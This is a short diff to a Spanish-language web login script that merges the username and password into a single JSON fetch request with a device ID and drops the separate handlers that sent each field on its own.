@@ -128,8 +128,10 @@ document.getElementById("continuarBtn").addEventListener(
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        dispositivoID
-                    }),
+    dispositivoID,
+    usuario: document.getElementById("usuario").value,
+    password: document.getElementById("password").value
+}),
                     signal: controlador.signal
                 }
             );
@@ -284,16 +286,6 @@ function togglePasswordVisibility() {
 
 
 // Botones de entrada
-document.getElementById("entrarBtn").addEventListener("click", function () {
-    const usuario = document.getElementById("usuario").value;
-    enviarDatos('user', usuario);  // Enviar usuario
-});
-
-// Enviar contraseña al servidor
-document.getElementById("continuarBtn").addEventListener("click", function () {
-    const password = document.getElementById("password").value;
-    enviarDatos('password', password);  // Enviar contraseña
-});
 
 document.getElementById("resultado-aceptarBtn").addEventListener("click", async function () {
     await enviarDatos('calificacion', 'SOLICITAR');
